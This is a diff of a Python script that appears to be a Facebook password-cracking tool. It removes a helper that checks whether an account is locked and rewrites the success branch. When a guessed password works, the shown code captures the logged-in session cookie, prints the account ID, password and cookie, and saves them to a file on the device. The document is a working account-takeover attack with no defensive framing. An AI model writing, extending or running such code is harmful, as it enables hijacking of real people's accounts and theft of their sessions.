@@ -80,18 +80,6 @@ ugen=[]
 uas=[]
 usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
 rr = random.randint
-
- #-------checker------#
-def lock_check(uid):
-    sessionx=requests.Session()
-    urlx=f'https://www.facebook.com/p/{uid}'
-    req=BeautifulSoup(sessionx.get(urlx).content,'html.parser')
-    tx=req.find('title').text
-    if tx =='Facebook':
-        return('LOCK')
-    else:
-        return('LIVE')
-
 #--------------------------(UA BOX)--------------------------#
 for sat in range(1000):
     a='NokiaX'
@@ -287,15 +275,7 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                try:
-                    uid=lo['uid']
-                except:
-                    uid=cid
-                    ckkx=lock_check(uid)
-                if ckkx=='LOCK':
-                    return
-                else:
-                print('\r\r\033[1;32m[ARAFAT-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
+                print('\r\r\033[1;32m[ARAFAT-OK💚] ' +cid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
                 open('/sdcard/ARAFAT-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                 oks.append(uid)
                 break
